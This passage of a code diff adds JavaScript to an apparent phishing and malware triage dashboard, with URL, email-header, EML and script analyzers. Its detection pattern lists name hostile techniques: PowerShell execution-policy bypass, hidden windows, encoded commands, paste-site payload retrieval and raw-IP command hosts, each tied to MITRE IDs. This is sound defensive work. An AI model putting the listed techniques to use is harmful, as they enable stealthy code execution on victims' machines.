+  const SUSP_EXT_RE = /[\w\-. ]+?(\.(?:hta|exe|bat|cmd|vbs|js|jse|wsf|wsh|scr|pif|dll|lnk|iso|msi|cpl|ps1))\b/gi;
+  const susp_extensions = [];
+  const seenExts = new Set();
+  let m;
+  const extInfo = {
+    '.hta':['CRITICAL',40,'HTA file — HTML Application, direct exec without sandbox.','T1218.005'],
+    '.exe':['CRITICAL',40,'Executable dropped/referenced in script.','T1204.002'],
+    '.bat':['HIGH',25,'Batch script — common dropper/loader.','T1059.003'],
+    '.cmd':['HIGH',22,'CMD script — command execution.','T1059.003'],
+    '.vbs':['HIGH',22,'VBScript — scriptlet / WSH execution.','T1059.005'],
+    '.js': ['HIGH',20,'JavaScript — JScript WSH execution.','T1059.007'],
+    '.jse':['CRITICAL',30,'Encoded JScript — obfuscated execution.','T1059.007'],
+    '.scr':['CRITICAL',35,'Screensaver PE — executable disguise.','T1204.002'],
+    '.pif':['CRITICAL',35,'PIF file — executable, ignored by email filters.','T1204.002'],
+    '.dll':['HIGH',28,'DLL reference — side-loading / reflective injection.','T1055.001'],
+    '.lnk':['HIGH',22,'Shortcut file — common spear-phishing vector.','T1547.009'],
+    '.ps1':['MEDIUM',10,'PowerShell script file reference.','T1059.001'],
+  };
+  while((m=SUSP_EXT_RE.exec(raw))!==null){
+    const ext=m[1].toLowerCase();
+    if(!seenExts.has(ext)&&extInfo[ext]){
+      seenExts.add(ext);
+      const [tag,score,desc,mitre]=extInfo[ext];
+      const ctx=raw.substring(Math.max(0,m.index-30),m.index+m[0].length+30);
+      susp_extensions.push({ext,tag,score,text:desc,mitre,context:ctx.substring(0,120)});
+    }
+  }
+
+  const FLAG_PATTERNS = [
+    [/-(?:exec(?:utionpolicy)?|ep)\s+bypass/i,'CRITICAL',30,'-ExecutionPolicy Bypass — skips all PS script signing checks.','T1059.001'],
+    [/-(?:w(?:indowstyle)?\s+h(?:idden)?|win\s+hid)/i,'HIGH',18,'-WindowStyle Hidden — stealth execution, no UI.','T1059.001'],
+    [/-(?:nop(?:rofile)?)/i,'MEDIUM',10,'-NoProfile — bypasses profile-based logging.','T1059.001'],
+    [/-(?:noni(?:nteractive)?)/i,'MEDIUM',8,'-NonInteractive — no user prompts.','T1059.001'],
+    [/-(?:e(?:nc(?:odedcommand)?)?)\s+[A-Za-z0-9+/=]{10,}/i,'HIGH',20,'-EncodedCommand — base64 payload.','T1027'],
+    [/(?:set-)?executionpolicy\s+unrestricted/i,'HIGH',20,'ExecutionPolicy Unrestricted — fully disables script lockdown.','T1059.001'],
+  ];
+  const exec_flags = FLAG_PATTERNS
+    .filter(([re])=>re.test(raw))
+    .map(([,tag,score,text,mitre])=>({tag,score,text,mitre}));
+
+  const URL_PATTERNS = [
+    [/https?:\/\/\d{1,3}(?:\.\d{1,3}){3}[:/]/i,'CRITICAL',30,'Raw IP address C2 — avoids DNS sinkholes.','T1071.001'],
+    [/https?:\/\/[^\s]{0,60}\.(?:xyz|tk|ml|ga|pw|top|click|online|site)[/\s"']/i,'HIGH',22,'Suspicious TLD in URL.','T1071.001'],
+    [/\.hta(?:["'\s?#]|$)/i,'CRITICAL',35,'HTA file URL — direct HTML Application execution.','T1218.005'],
+    [/\.(?:exe|dll|bat|scr|ps1|vbs|js|hta)\b/i,'HIGH',20,'Executable extension in URL.','T1105'],
+    [/(?:pastebin\.com|ghostbin\.co|hastebin)/i,'HIGH',20,'Paste-site C2 — hosted payload retrieval.','T1105'],
+    [/(?:cmd=|exec=|payload=|shell=|invoke=)/i,'HIGH',18,'Suspicious query parameter.','T1059'],
+  ];
+  const susp_urls = URL_PATTERNS
+    .filter(([re])=>re.test(text))
+    .map(([re,tag,score,desc,mitre])=>{
+      const mt=text.match(re);
+      return {tag,score,text:desc,mitre,context:(mt?mt[0]:'').substring(0,80)};
+    });
+
+  const OBF_PATTERNS = [
+    [/\[char\]|\[convert\]/i,'HIGH',18,'Char-code obfuscation — string assembly.','T1027'],
+    [/(?:`[a-z]){3,}/,'HIGH',15,'Backtick escape obfuscation.','T1027'],
+    [/(?:replace|split|join|reverse)\s*\(/i,'MEDIUM',8,'String manipulation obfuscation.','T1027'],
+    [/\[regex\]::/i,'MEDIUM',10,'Reflection string ops — evasion via .NET.','T1027'],
+    [/\$env:(?:temp|appdata|localappdata)/i,'MEDIUM',12,'Env-var staging path.','T1027'],
+  ];
+  const obfuscation = OBF_PATTERNS
+    .filter(([re])=>re.test(text))
+    .map(([,tag,score,desc,mitre])=>({tag,score,text:desc,mitre}));
+
+  const score_delta = Math.min(
+    susp_extensions.reduce((s,f)=>s+f.score,0) +
+    exec_flags.reduce((s,f)=>s+f.score,0) +
+    susp_urls.reduce((s,f)=>s+f.score,0) +
+    obfuscation.reduce((s,f)=>s+f.score,0), 60);
+
+  const extra_mitre = [...new Set(
+    [...susp_extensions,...exec_flags,...susp_urls,...obfuscation]
+      .map(f=>f.mitre).filter(Boolean)
+  )];
+
+  return {susp_extensions, exec_flags, susp_urls, obfuscation, score_delta, extra_mitre};
+}
+
+// Entropy helper returning a float (for local analysis)
+function entropyVal(str){
+  if(!str)return 0;
+  const freq={};
+  for(const c of str)freq[c]=(freq[c]||0)+1;
+  const n=str.length;
+  return -Object.values(freq).reduce((s,f)=>s+=(f/n)*Math.log2(f/n),0);
+}
+
+
+
+// ══════════════════════════════════════════════════════════
+// URL ANALYZER
+// ══════════════════════════════════════════════════════════
+function clearURL(){$('urlIn').value='';$('urlRes').classList.remove('on');}
+
+async function analyzeURL(){
+  const raw=$('urlIn').value.trim();if(!raw){toast('Enter a URL','r');return;}
+  $('urlRes').classList.remove('on');$('urlLd').classList.add('on');
+  for(const m of['TRACING REDIRECTS...','SCANNING HOSTNAME...','SCORING THREAT...',backendOnline?'CHECKING VIRUSTOTAL...':'ANALYZING PARAMS...']){$('urlLm').textContent=m;await sleep(380);}
+  $('urlLd').classList.remove('on');
+  let d;
+  if(backendOnline){
+    try{const r=await fetch(API_BASE+'/scan/url',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:raw})});d=await r.json();}catch(e){d=null;}
+  }
+  if(!d){
+    // Local fallback
+    const url=raw.startsWith('http')?raw:'https://'+raw;
+    let host='',path='/',query='',parts=[];
+    try{const p=new URL(url);host=p.hostname;path=p.pathname;query=p.search;parts=host.split('.').filter(Boolean);}catch(e){host=raw;parts=[raw];}
+    let score=0;const inds=[];
+    const SUSP_TLD=['.xyz','.tk','.ml','.ga','.cf','.gq','.pw','.top','.click','.online','.site','.buzz'];
+    const BRANDS=['paypal','amazon','microsoft','apple','google','facebook','instagram','netflix','bankof','coinbase','verify','secure-','login','signin','account-'];
+    if(/^\d{1,3}(\.\d{1,3}){3}/.test(host)){score+=22;inds.push({tag:'HIGH',text:'Raw IP host.'});}
+    const tld=SUSP_TLD.find(t=>host.endsWith(t));if(tld){score+=20;inds.push({tag:'HIGH',text:`Suspicious TLD: ${tld}`});}
+    BRANDS.filter(b=>host.includes(b)).forEach(b=>{score+=18;inds.push({tag:'HIGH',text:`Brand impersonation: ${b}`});});
+    if(host.length>40){score+=10;inds.push({tag:'MEDIUM',text:`Long domain (${host.length} chars).`});}
+    if(parts.length>4){score+=10;inds.push({tag:'MEDIUM',text:`${parts.length-2} subdomain levels.`});}
+    if(!url.startsWith('https')){score+=8;inds.push({tag:'MEDIUM',text:'No HTTPS.'});}
+    ['cmd=','exec=','payload','b64=','bypass','shell','install'].forEach(k=>{if(url.toLowerCase().includes(k)){score+=14;inds.push({tag:'HIGH',text:`Suspicious param: ${k}`});}});
+    if(!inds.length)inds.push({tag:'INFO',text:'No phishing indicators.'});
+    score=Math.min(score,100);
+    d={risk_level:score>=70?'HIGH':score>=35?'MEDIUM':'LOW',risk_score:score,hostname:host,path,query,subdomain_depth:Math.max(0,parts.length-2),protocol:url.startsWith('https')?'HTTPS':'HTTP',indicators:inds,iocs:{},virustotal:{configured:false},ml:{available:false,message:'Start Flask backend + run train_model.py for ML predictions'}};
+  }
+  lastScanData.url=d;
+  setRisk('urlRK','urlRV','urlSN','urlPB',d.risk_score);
+  // VT result
+  const vt=d.virustotal||{};
+  if(vt.configured!==false){
+    $('vtBox').style.display='block';
+    if(vt.error){$('vtBox').className='vt-box unknown';$('vtContent').textContent='VT Error: '+vt.error;}
+    else if(!vt.found){$('vtBox').className='vt-box unknown';$('vtContent').textContent='Not found in VirusTotal database.';}
+    else{
+      const pct=vt.total>0?Math.round((vt.malicious/vt.total)*100):0;
+      $('vtBox').className=`vt-box ${vt.malicious>0?'dirty':'clean'}`;
+      $('vtContent').innerHTML=`<span style="color:${vt.malicious>0?'var(--r)':'var(--g)'}">🔬 ${vt.malicious}/${vt.total} engines flagged malicious</span>`;
+    }
+  }else{$('vtBox').style.display='none';}
+
+  // ML PREDICTION RESULT
+  const ml=d.ml||{};
+  if(ml.available!==false && ml.prediction){
+    $('mlBox').style.display='block';
+    const isPhish = ml.prediction==='PHISHING';
+    const mlColor = isPhish?'var(--r)':'var(--g)';
+    const mlBg    = isPhish?'rgba(255,32,96,.06)':'rgba(0,255,127,.04)';
+    const mlBdr   = isPhish?'var(--r)':'var(--g)';
+
+    $('mlModelTag').textContent = `Accuracy: ${ml.model_accuracy}%  |  ${ml.algorithm}`;
+
+    $('mlVerdict').style.cssText=`background:${mlBg};border-color:${mlBdr};display:flex;align-items:center;gap:16px;margin-bottom:14px;padding:12px 16px;border-radius:2px;border:1px solid`;
+    $('mlVerdict').innerHTML=`
+      <div>
+        <div style="font-size:.5rem;letter-spacing:2px;color:var(--dim2);font-family:var(--ft);margin-bottom:3px">ML VERDICT</div>
+        <div style="font-family:var(--fo);font-size:1.4rem;font-weight:900;color:${mlColor};text-shadow:0 0 12px ${mlColor}">${ml.prediction}</div>
+      </div>
+      <div style="flex:1">
+        <div style="font-size:.5rem;color:var(--dim2);font-family:var(--ft);margin-bottom:2px">CONFIDENCE</div>
+        <div style="font-family:var(--fo);font-size:1.1rem;font-weight:900;color:${mlColor}">${ml.confidence}%</div>
+      </div>
+      <div style="text-align:right">
+        <div style="font-size:.5rem;color:var(--dim2);font-family:var(--ft);margin-bottom:2px">TRAINED ON</div>
+        <div style="font-size:.64rem;color:var(--tx);font-family:var(--ft)">${ml.trained_on||'10,000 URLs'}</div>
+      </div>`;
+
+    setTimeout(()=>{
+      $('mlPhishPct').textContent=ml.phishing_prob+'%';
+      $('mlLegitPct').textContent=ml.legit_prob+'%';
+      $('mlPhishBar').style.width=ml.phishing_prob+'%';
+      $('mlLegitBar').style.width=ml.legit_prob+'%';
+    },200);
+
+    if(ml.top_features&&ml.top_features.length){
+      $('mlFeatures').innerHTML=ml.top_features.map(f=>{
+        const val=f.value>0?'var(--r)':'var(--dim2)';
+        const pct=Math.min(f.importance*4,100);
+        return`<div style="background:rgba(0,0,0,.3);border:1px solid var(--b1);padding:7px 10px;border-radius:1px">
+          <div style="font-size:.55rem;color:var(--dim2);font-family:var(--ft);margin-bottom:3px">${f.name.replace(/_/g,' ').toUpperCase()}</div>
+          <div style="height:3px;background:rgba(0,0,0,.4);border-radius:2px;margin-bottom:4px;overflow:hidden">
+            <div style="height:100%;width:${pct}%;background:var(--p);border-radius:2px"></div>
+          </div>
+          <div style="display:flex;justify-content:space-between">
+            <span style="font-size:.6rem;color:var(--p);font-family:var(--fo)">${f.importance.toFixed(1)}% imp</span>
+            <span style="font-size:.6rem;color:${val}">${f.value}</span>
+          </div>
+        </div>`;
+      }).join('');
+    }
+  } else { $('mlBox').style.display='none'; }
+  // Redirect chain
+  const chain=[{url:raw,note:''}];
+  const short=['bit.ly','tinyurl','t.co','goo.gl','ow.ly','is.gd','buff.ly'];
+  if(short.some(s=>d.hostname.includes(s))){chain.push({url:'→ redirect via shortener',note:'True destination hidden'});}
+  else if(raw.includes('redirect')||raw.includes('url=')||raw.includes('goto=')){chain.push({url:'→ redirect parameter',note:'Multi-hop chain detected'});}
+  $('urlChain').innerHTML=chain.map((c,i)=>`<div class="rc-item"><span class="rc-step">HOP ${i+1}</span><div><div class="rc-url">${esc(c.url)}</div>${c.note?`<div class="rc-note">${esc(c.note)}</div>`:''}</div></div>`).join('');
+  const proto=d.protocol||'HTTPS';
+  $('urlMeta').innerHTML=card('PROTOCOL',proto,proto==='HTTPS'?'ok':'warn')+card('HOSTNAME',d.hostname)+card('PATH',d.path||'/')+card('QUERY',d.query||'None',d.query?'warn':'ok')+card('SUBDOMAIN DEPTH',d.subdomain_depth,d.subdomain_depth>2?'bad':d.subdomain_depth>0?'warn':'ok')+card('REDIRECT HOPS',chain.length,chain.length>1?'warn':'ok')+card('DOMAIN LENGTH',(d.hostname||'').length,(d.hostname||'').length>40?'bad':(d.hostname||'').length>25?'warn':'ok')+card('INDICATORS',(d.indicators||[]).filter(i=>i.tag!=='INFO').length,(d.indicators||[]).filter(i=>i.tag!=='INFO').length>2?'bad':(d.indicators||[]).filter(i=>i.tag!=='INFO').length>0?'warn':'ok');
+  $('urlInds').innerHTML=(d.indicators||[]).map(i=>indItem(i.tag,i.tag==='HIGH'?'th':i.tag==='MEDIUM'?'tm':i.tag==='CRITICAL'?'tc':'ti',i.text||i.txt||'')).join('');
+  $('urlTS').textContent='Analysis: '+now();$('urlRes').classList.add('on');
+  addHistory('URL',raw.substring(0,50),d.risk_level,d.risk_score);updateHeader();
+  toast(`URL analyzed — ${d.risk_score}/100`,d.risk_score>=70?'r':d.risk_score>=35?'c':'g');
+}
+
+// ══════════════════════════════════════════════════════════
+// EML SCANNER
+// ══════════════════════════════════════════════════════════
+function emlDrag(e,on){e.preventDefault();$('dzEml').classList.toggle('drag',on);}
+function emlDrop(e){e.preventDefault();emlDrag(e,false);if(e.dataTransfer.files[0])handleEml(e.dataTransfer.files[0]);}
+function clearEml(){$('emlRes').classList.remove('on');$('emlFn').style.display='none';}
+
+async function handleEml(file){
+  if(!file){return;}
+  const fn=file.name.toLowerCase();
+  if(!fn.endsWith('.eml')&&!fn.endsWith('.msg')){toast('Upload a .eml file','r');return;}
+  $('emlFn').textContent='📧 '+file.name+' ('+fmtSize(file.size)+')';
+  $('emlFn').style.display='block';
+  $('emlRes').classList.remove('on');
+  $('emlLd').classList.add('on');
+  const steps=[['PARSING EMAIL...','reading structure'],['CHECKING HEADERS...','SPF · DKIM · DMARC'],['SCANNING BODY URLS...','running ML model'],['ANALYZING ATTACHMENTS...','entropy + decode']];
+  for(const[m] of steps){$('emlLm').textContent=m;await sleep(350);}
+
+  if(!backendOnline){$('emlLd').classList.remove('on');toast('Backend required for EML scan — start Flask server','r');return;}
+
+  const fd=new FormData();fd.append('file',file);
+  try{
+    const r=await fetch(API_BASE+'/scan/eml',{method:'POST',body:fd});
+    const d=await r.json();
+    if(d.error){$('emlLd').classList.remove('on');toast('Error: '+d.error,'r');return;}
+    $('emlLd').classList.remove('on');
+    renderEmlResult(d, file.name);
+    const lvl=d.risk_level;
+    toast(`Email scanned — ${lvl} risk · ${d.summary.urls_found} URLs · ${d.summary.attachments} attachment(s)`,lvl==='HIGH'?'r':lvl==='MEDIUM'?'o':'g');
+    addHistory('EML', file.name, d.risk_level, d.risk_score);
+    totalIOCs += d.summary.ioc_count; updateHeader();
+  }catch(e){$('emlLd').classList.remove('on');toast('Scan error: '+e.message,'r');}
+}
+
+function renderEmlResult(d, fname){
+  // Stat row
+  $('eHdrScore').textContent = d.headers.score;
+  $('eUrls').textContent     = d.body.url_count;
+  $('eAttach').textContent   = d.attachments.length;
+  const phishCount = d.urls.filter(u=>u.ml&&u.ml.prediction==='PHISHING').length;
+  $('ePhish').textContent    = phishCount;
+  $('eIOCt').textContent     = d.summary.ioc_count;
+
+  // Composite risk
+  setRisk('emlRK','emlRV','emlSN','emlPB', d.risk_score);
+  $('emlMitreSub').textContent = d.mitre.length ? '⚔️ '+d.mitre.slice(0,4).join(' · ') : '';
+
+  // Metadata
+  const m=d.headers.metadata;
+  $('emlMeta').innerHTML=[
+    card('FROM', m.from),
+    card('FROM EMAIL', m.from_email),
+    card('SUBJECT', m.subject),
+    card('DATE', m.date),
+    card('REPLY-TO', m.reply_to),
+    card('MESSAGE-ID', m.message_id),
+    card('RECEIVED HOPS', m.received_hops),
+    card('AUTH-RESULTS', m.auth_results.substring(0,80)+(m.auth_results.length>80?'…':'')),
+    card('SHA-256', d.eml_sha256.substring(0,32)+'…'),
+  ].join('');
+
+  // Header flags
+  const hdrScore=d.headers.score;
+  const hBadge=$('emlHdrBadge');
+  if(hdrScore>=70){hBadge.textContent='HIGH RISK';hBadge.style.cssText='background:var(--r);color:#fff';}
+  else if(hdrScore>=35){hBadge.textContent='SUSPICIOUS';hBadge.style.cssText='background:var(--o);color:#000';}
+  else{hBadge.textContent='CLEAN';hBadge.style.cssText='background:var(--g);color:#000';}
+  $('emlHdrInds').innerHTML=d.headers.flags.map(f=>indItem(f.tag,tagClass(f.tag),f.text,f.mitre||'')).join('');
+
+  // Body flags + preview
+  $('emlBodyInds').innerHTML = d.body.flags.length
+    ? d.body.flags.map(f=>indItem(f.tag,tagClass(f.tag),f.text,f.mitre||'')).join('')
+    : '<li class="ii"><span class="tag ti">INFO</span><div class="ii-body"><span>No suspicious body patterns detected.</span></div></li>';
+  if(d.body.preview){
+    $('emlBodyPreview').textContent = d.body.preview;
+    $('emlBodyPreview').style.display='block';
+  }
+
+  // URL results
+  if(d.urls&&d.urls.length){
+    $('emlUrlSec').style.display='';
+    $('emlUrlList').innerHTML=d.urls.map(u=>{
+      const ml=u.ml||{};const isPhish=ml.prediction==='PHISHING';
+      const rc=u.risk==='HIGH'?'var(--r)':u.risk==='MEDIUM'?'var(--o)':'var(--g)';
+      return `<div class="panel" style="margin-bottom:8px;border-color:${rc}40">
+        <div style="padding:9px 13px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+            <span style="font-size:.68rem;color:${rc};font-family:var(--ft);font-weight:700">${u.risk} · ${u.score}/100</span>
+            ${ml.available?`<span style="font-size:.6rem;padding:2px 8px;border-radius:2px;background:${isPhish?'rgba(255,32,96,.15)':'rgba(0,255,127,.1)'};color:${isPhish?'var(--r)':'var(--g)'};font-family:var(--fo)">ML: ${ml.prediction} ${ml.phishing_prob}%</span>`:''}
+          </div>
+          <div style="font-size:.66rem;color:var(--tx);word-break:break-all;margin-bottom:4px">${esc(u.url)}</div>
+          ${u.indicators.length?`<div style="font-size:.58rem;color:var(--dim2)">${u.indicators.map(esc).join(' · ')}</div>`:''}
+        </div>
+      </div>`;
+    }).join('');
+  }
+
+  // Attachment results
+  if(d.attachments&&d.attachments.length){
+    $('emlAttachSec').style.display='';
+    $('emlAttachList').innerHTML=d.attachments.map(a=>{
+      const rc=a.risk==='HIGH'?'var(--r)':a.risk==='MEDIUM'?'var(--o)':'var(--g)';
+      return `<div class="panel" style="margin-bottom:10px;border-color:${rc}40">
+        <div class="ph" style="background:rgba(0,0,0,.3);color:${rc}">
+          📎 ${esc(a.filename)} <span style="margin-left:auto;font-size:.55rem">${a.risk} · ${a.score}/100 · ${fmtSize(a.size)} · entropy ${a.entropy}</span>
+        </div>
+        <div class="pb2" style="padding:10px 13px">
+          ${a.indicators.length?`<ul class="il">${a.indicators.map(f=>indItem(f.tag,tagClass(f.tag),f.text,f.mitre||'')).join('')}</ul>`:''}
+          ${a.decoded&&a.decoded!='[binary]'?`<div class="mono" style="margin-top:8px;max-height:100px;overflow-y:auto;font-size:.6rem">${esc(a.decoded.substring(0,500))}</div>`:''}
+        </div>
+      </div>`;
+    }).join('');
+  }
+
+  // MITRE
+  renderMitre(d.mitre,'emlMitre');
+
+  // IOCs
+  renderIOCGrid(d.iocs,'emlIOCs');
+
+  $('emlTS').textContent='Scan completed: '+now()+' | '+fname;
+  $('emlRes').classList.add('on');
+}
+
+function tagClass(tag){
+  return tag==='CRITICAL'?'tc':tag==='HIGH'?'th':tag==='MEDIUM'?'tm':'ti';
+}
+
+// ══════════════════════════════════════════════════════════
+// FEATURE 1: EMAIL HEADER ANALYZER
+// ══════════════════════════════════════════════════════════
+async function analyzeHeaders(){
+  const raw=$('hdrsIn').value.trim();
+  if(!raw){toast('Paste raw headers first','r');return;}
+  $('hdrsLd').classList.add('on');
+  $('hdrsRes').style.display='none';
+
+  // ── LOCAL PARSER (works without backend) ──────────────
+  function localParseHeaders(txt){
+    const get=(hdr)=>{const m=txt.match(new RegExp('^'+hdr+':\\s*(.+)','im'));return m?m[1].trim():''};
+    const getAll=(hdr)=>{const re=new RegExp('^'+hdr+':\\s*(.+)','gim');const r=[];let m;while((m=re.exec(txt))!==null)r.push(m[1].trim());return r;};
+    const from=get('From'),replyTo=get('Reply-To'),retPath=get('Return-Path'),
+          subj=get('Subject'),authRes=get('Authentication-Results'),msgId=get('Message-ID'),date=get('Date');
+    const fromEmail=(from.match(/<([^>]+)>/)||['',from])[1].toLowerCase();
+    const fromDomain=fromEmail.includes('@')?fromEmail.split('@').pop():'';
+    const received=getAll('Received');
+    let score=0;const flags=[];const al=authRes.toLowerCase();
+    if(al.includes('spf=fail')||al.includes('spf=softfail')){score+=25;flags.push({tag:'CRITICAL',text:'SPF authentication failed — sender domain unverifiable.'});}
+    else if(!al.includes('spf=pass')&&al){score+=10;flags.push({tag:'MEDIUM',text:'SPF result missing or neutral.'});}
+    if(al.includes('dkim=fail')){score+=20;flags.push({tag:'HIGH',text:'DKIM signature verification failed.'});}
+    else if(al.includes('dkim=none')){score+=8;flags.push({tag:'MEDIUM',text:'No DKIM signature present.'});}
+    if(al.includes('dmarc=fail')){score+=22;flags.push({tag:'CRITICAL',text:'DMARC policy check failed — domain impersonation likely.'});}
+    const rtEmail=(replyTo.match(/<([^>]+)>/)||['',replyTo])[1].toLowerCase();
+    const rtDomain=rtEmail.includes('@')?rtEmail.split('@').pop():'';
+    if(rtDomain&&fromDomain&&rtDomain!==fromDomain){score+=30;flags.push({tag:'CRITICAL',text:`Reply-To domain (${rtDomain}) differs from From domain (${fromDomain}) — classic phishing redirect.`});}
+    const BRANDS=['paypal','amazon','microsoft','apple','google','facebook','instagram','netflix','coinbase','binance','linkedin','twitter','docusign','fedex','dhl','hsbc','chase'];
+    BRANDS.forEach(b=>{if(from.toLowerCase().includes(b)&&!fromDomain.includes(b)){score+=25;flags.push({tag:'CRITICAL',text:`Display name impersonates "${b}" but sender domain is "${fromDomain}".`});}});
+    const SUSP_TLD=['.xyz','.tk','.ml','.ga','.cf','.gq','.pw','.top','.click','.online','.site','.buzz','.icu'];
+    const tld='.'+fromDomain.split('.').pop();
+    if(SUSP_TLD.includes(tld)){score+=20;flags.push({tag:'HIGH',text:`Suspicious sender TLD (${tld}).`});}
+    const URGENCY=['urgent','verify','suspended','account locked','action required','click here','update your','password expired'];
+    const sl=subj.toLowerCase();const urg=URGENCY.filter(u=>sl.includes(u));
+    if(urg.length>=2){score+=18;flags.push({tag:'HIGH',text:`Subject urgency language: ${urg.slice(0,3).join(', ')}.`});}
+    else if(urg.length===1){score+=8;flags.push({tag:'MEDIUM',text:`Subject urgency keyword: "${urg[0]}".`});}
+    if(received.length<2){score+=12;flags.push({tag:'MEDIUM',text:`Only ${received.length} Received header(s) — possibly crafted.`});}
+    if(!flags.length)flags.push({tag:'INFO',text:'No suspicious header patterns detected.'});
+    // Received chain parse
+    const chain=received.map(r=>{
+      const ips=(r.match(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g)||[]).filter(ip=>!/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip));
+      const byM=r.match(/\bby\s+(\S+)/i),frM=r.match(/\bfrom\s+(\S+)/i),wiM=r.match(/\bwith\s+(\S+)/i),dtM=r.match(/;\s*(.+)$/);
+      return{raw:r.slice(0,280),ips,by:byM?byM[1]:'',from_host:frM?frM[1]:'',protocol:wiM?wiM[1]:'',date:dtM?dtM[1].trim():''};
+    });
+    let origIP='';
+    for(let i=chain.length-1;i>=0;i--){if(chain[i].ips.length){origIP=chain[i].ips[0];break;}}
+    return{score:Math.min(score,100),flags,metadata:{from,from_email:fromEmail,from_domain:fromDomain,reply_to:replyTo||'(none)',return_path:retPath||'(none)',subject:subj||'(no subject)',auth_results:authRes||'(not present)',message_id:msgId||'(none)',received_hops:received.length,date},received_chain:chain,originating_ip:origIP,iocs:localExtractIOCs(txt)};
+  }
+
+  let d;
+  if(backendOnline){
+    try{
+      const r=await fetch(API_BASE+'/scan/headers',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({headers:raw})});
+      d=await r.json();
+    }catch(e){d=localParseHeaders(raw);}
+  } else {
+    d=localParseHeaders(raw);
+  }
+
+  $('hdrsLd').classList.remove('on');
+  if(d.error&&!d.flags){toast(d.error,'r');return;}
+
+  const score=d.risk_score||d.score||0;
+  const lvl=(score>=70?'HIGH':score>=35?'MEDIUM':'LOW').toLowerCase();
+  const color=lvl==='high'?'var(--r)':lvl==='medium'?'var(--o)':'var(--g)';
+  $('hdrsRisk').innerHTML=`<div class="rk ${lvl}"><div><div class="rk-l">HEADER RISK LEVEL</div><div class="rk-v">${lvl.toUpperCase()}</div></div><div class="rk-r"><div class="rk-n" style="font-size:2rem">${score}</div><span class="rk-sl">/ 100</span></div></div>`;
+
+  const m=d.metadata||{};
+  $('hdrsMeta').innerHTML=[
+    ['From',m.from||'-'],['From Email',m.from_email||'-'],['From Domain',m.from_domain||'-'],
+    ['Reply-To',m.reply_to||'-'],['Return-Path',m.return_path||'-'],
+    ['Subject',m.subject||'-'],['Date',m.date||'-'],['Message-ID',m.message_id||'-'],
+    ['Auth-Results',m.auth_results||'(not present)'],['Received Hops',m.received_hops??'-']
+  ].map(([l,v])=>`<div class="mc"><div class="ml">${l}</div><div class="mv" style="word-break:break-all;font-size:.68rem">${esc(String(v))}</div></div>`).join('');
+
+  const tagColor={CRITICAL:'var(--r)',HIGH:'var(--r)',MEDIUM:'var(--o)',LOW:'var(--g)',INFO:'var(--c)'};
+  $('hdrsFlags').innerHTML=(d.flags||[]).map(f=>`<div style="padding:9px 12px;border-left:3px solid ${tagColor[f.tag]||'var(--dim)'};background:rgba(0,0,0,.02);margin-bottom:7px;border-radius:0 4px 4px 0"><span style="font-size:.54rem;font-family:var(--fo);color:${tagColor[f.tag]||'var(--dim)'};margin-right:8px">${f.tag}</span><span style="font-size:.75rem">${esc(f.text)}</span></div>`).join('');
+
+  const chain=d.received_chain||[];
+  if(chain.length){
+    $('hdrsChain').innerHTML=chain.map((hop,i)=>`
+      <div style="margin-bottom:12px;padding:10px 13px;background:rgba(0,82,180,.03);border:1px solid var(--b1);border-radius:4px">
+        <div style="font-size:.54rem;color:var(--dim2);font-family:var(--ft);letter-spacing:2px;margin-bottom:5px">HOP ${chain.length-i} — ${hop.protocol||'SMTP'}</div>
+        ${hop.from_host?`<div style="font-size:.7rem;margin-bottom:3px"><span style="color:var(--dim2)">FROM: </span>${esc(hop.from_host)}</div>`:''}
+        ${hop.by?`<div style="font-size:.7rem;margin-bottom:3px"><span style="color:var(--dim2)">BY: </span>${esc(hop.by)}</div>`:''}
+        ${hop.ips.length?`<div style="font-size:.7rem;margin-bottom:3px"><span style="color:var(--dim2)">IPs: </span>${hop.ips.map(ip=>`<span style="color:var(--c);font-family:var(--fm)">${esc(ip)}</span>`).join(', ')}</div>`:''}
+        ${hop.date?`<div style="font-size:.65rem;color:var(--dim2)">${esc(hop.date)}</div>`:''}
+      </div>`).join('');
+  } else {
+    $('hdrsChain').innerHTML='<div style="color:var(--dim2);font-size:.72rem">No Received headers found.</div>';
+  }
+
+  const origIP=d.originating_ip||'';
+  const abuse=d.abuse_check||null;
+  $('hdrsIP').innerHTML=origIP
+    ? `<div class="mc" style="max-width:340px"><div class="ml">ORIGINATING IP</div><div class="mv info" style="font-size:1rem;margin-bottom:6px">${esc(origIP)}</div>
+       ${abuse?`<div style="font-size:.66rem;color:var(--dim2)">Abuse Confidence: <strong style="color:${abuse.abuse_confidence>50?'var(--r)':abuse.abuse_confidence>10?'var(--o)':'var(--g)'}">${abuse.abuse_confidence}%</strong>
+       &nbsp;|&nbsp; Country: ${esc(abuse.country)} &nbsp;|&nbsp; ISP: ${esc(abuse.isp)} &nbsp;|&nbsp; Reports: ${abuse.total_reports}</div>`:'<div style="font-size:.65rem;color:var(--dim2)">Set ABUSE_API_KEY for reputation check.</div>'}
+       </div>`
+    : '<div style="color:var(--dim2);font-size:.72rem">No public originating IP found in headers.</div>';
+
+  const iocTotal=renderIOCGrid(d.iocs||{},'hdrsIOC');
+  addHistory('headers',m.from||'Headers',lvl.toUpperCase(),score);
+  $('hdrsRes').style.display='block';
+  toast(`Header analysis complete — ${(d.flags||[]).length} flag(s)`,'c');
+}
+
+// ══════════════════════════════════════════════════════════
+// FEATURE 2: WHOIS / DOMAIN AGE
+// ══════════════════════════════════════════════════════════
+async function whoisCheck(){
+  const raw=$('whoisIn').value.trim();
+  if(!raw){toast('Enter a domain first','r');return;}
+  $('whoisLd').classList.add('on');
+  $('whoisRes').style.display='none';
+
+  if(!backendOnline){
+    $('whoisLd').classList.remove('on');
+    toast('WHOIS requires Flask backend — start app.py','r');
+    return;
+  }
+
+  try{
+    const r=await fetch(API_BASE+'/whois',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:raw})});
+    const d=await r.json();
+    $('whoisLd').classList.remove('on');
+
+    if(d.error&&!d.found){
+      $('whoisRes').style.display='block';
+      const is404=d.error.includes('404');
+      $('whoisAlert').innerHTML=`<div style="padding:14px 16px;border:1px solid ${is404?'var(--b2)':'var(--r)'};background:${is404?'rgba(0,82,180,.04)':'rgba(200,16,46,.05)'};border-radius:4px">
